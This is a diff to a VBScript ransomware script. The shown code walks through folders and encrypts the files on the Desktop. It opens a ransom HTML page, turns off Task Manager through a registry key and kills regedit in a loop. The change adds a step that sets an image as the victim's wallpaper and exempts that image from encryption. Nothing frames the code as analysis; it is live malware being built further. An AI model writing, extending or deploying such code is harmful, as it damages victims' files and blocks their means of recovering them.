@@ -22,7 +22,7 @@ if fso.folderexists(flder) then
 set folder = fso.getfolder(flder)
 
 for each item in folder.files
-    if not item.name = "HEAEHandxiDii.html" and not item.name = WScript.ScriptFullName and not item.name = "data.txt" then
+    if not item.name = "HEAEHandxiDii.html" and not item.name = WScript.ScriptFullName and not item.name = "data.txt" and not item.name = "bro.png" then
     itembasename = fso.GetBaseName(item)
     
     encryptornot = fso.GetExtensionName(item.name) = "enc"
@@ -75,6 +75,8 @@ doxxfile.close
 shell.run shell.specialfolders("AppData") & "\HEAEHandxiDii.html"
 
 do
+shell.RegWrite "HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper", fso.GetParentFolderName(WScript.ScriptFullName) & "\bro.png", "REG_SZ"
+Call shell.Run("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters")
 shell.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f",0,True
 shell.run "taskkill /f /im regedit.exe",0,True
 encryptfolder shell.specialfolders("Desktop")
